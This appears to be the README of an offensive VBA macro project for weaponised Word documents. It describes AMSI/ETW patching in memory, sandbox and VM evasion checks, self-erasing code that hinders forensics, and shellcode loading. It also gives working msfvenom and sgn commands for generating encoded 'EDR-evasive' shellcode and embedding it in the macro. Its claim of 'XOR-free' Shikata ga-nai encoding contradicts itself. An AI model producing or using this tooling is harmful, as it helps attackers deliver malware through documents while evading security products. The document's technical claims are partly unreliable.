# solid-macro
VB macro for Word exploit

### In-Memory AMSI/ETW Patching
  - Directly modifies critical security functions in RAM.
  - Uses string obfuscation ("AmsiScan" & "Buffer") to bypass static detection.

### Environmental Keying
  - Requires specific domain name (LAB-DOMAIN).
  - Checks for VMware tools process (vmtoolsd.exe).
  - Validates mouse movement and uptime.

### Polymorphic Self-Destruction
  - Overwrites macro code after execution to hinder forensics.

### Indirect Shellcode Loading
  - Uses XOR-free shellcode encoded with Shikata ga-nai.
  - Allocates RX memory only when needed.

## Shellcode Generation & Usage

Generate EDR-Evasive Shellcode:

```
msfvenom -p windows/x64/exec CMD="calc.exe" EXITFUNC=thread -f raw | sgn -a 64 -c 2 -o payload.raw
```

Convert to VBA-Compatible Hex:

```
xxd -p payload.raw | tr -d '\n' > payload.hex
```

Insert into Macro:

```
payload = DeobfuscateHex("fc4883e4...") ' Paste payload.hex contents
```
